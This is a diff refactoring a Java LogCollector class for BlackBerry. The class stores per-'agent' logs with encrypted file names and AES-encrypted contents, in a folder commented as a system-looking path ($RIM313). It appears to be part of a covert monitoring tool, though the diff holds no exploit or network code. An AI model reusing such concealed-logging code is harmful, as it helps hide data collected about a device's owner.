@@ -53,9 +53,10 @@ public class LogCollector implements Singleton {
     Vector logVector;
 
     private int logProgressive;
-
     private PersistentObject logProgressivePersistent;
 
+    Keys keys;
+    
     public static synchronized LogCollector getInstance() {
         if (instance == null) {
             instance = new LogCollector();
@@ -69,6 +70,7 @@ public class LogCollector implements Singleton {
         logVector = new Vector();
 
         logProgressive = deserializeProgressive();
+        keys = Keys.getInstance();
     }
 
     private static int getLogNum() {
@@ -82,11 +84,11 @@ public class LogCollector implements Singleton {
     }
 
     public static String encryptName(String logMask) {
-        return Encryption.encryptName(logMask, Keys.getChallengeKey()[0]);
+        return Encryption.encryptName(logMask, Keys.getInstance().getChallengeKey()[0]);
     }
     
     public static String decryptName(String logMask) {
-        return Encryption.decryptName(logMask, Keys.getChallengeKey()[0]);
+        return Encryption.decryptName(logMask, Keys.getInstance().getChallengeKey()[0]);
     }
 
     private synchronized int deserializeProgressive() {
@@ -118,7 +120,7 @@ public class LogCollector implements Singleton {
             return null;
         }
 
-        Log log = new Log(agent, Keys.getAesKey());
+        Log log = new Log(agent, keys.getAesKey());
 
         return log;
     }
@@ -164,11 +166,11 @@ public class LogCollector implements Singleton {
         String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
         String fileName = this.makeDateName(timestamp);
 
-        String encName = Encryption.encryptName(fileName + LOG_EXTENSION, Keys
+        String encName = Encryption.encryptName(fileName + LOG_EXTENSION, keys
                 .getChallengeKey()[0]);
 
         vector.addElement(new Integer(progressive));
-        vector.addElement(basePath + Path.LOG_DIR); // file:///SDCard/BlackBerry/system/$RIM313/$1
+        vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
         vector.addElement(blockDir); // 1
         vector.addElement(encName); // ?
         return vector;
@@ -258,7 +260,7 @@ public class LogCollector implements Singleton {
             fc = (FileConnection) Connector.open(currentPath);
 
             if (fc.isDirectory()) {
-                Enumeration fileLogs = fc.list(Path.LOG_DIR + "*", true);
+                Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*", true);
 
                 while (fileLogs.hasMoreElements()) {
                     String dir = (String) fileLogs.nextElement();
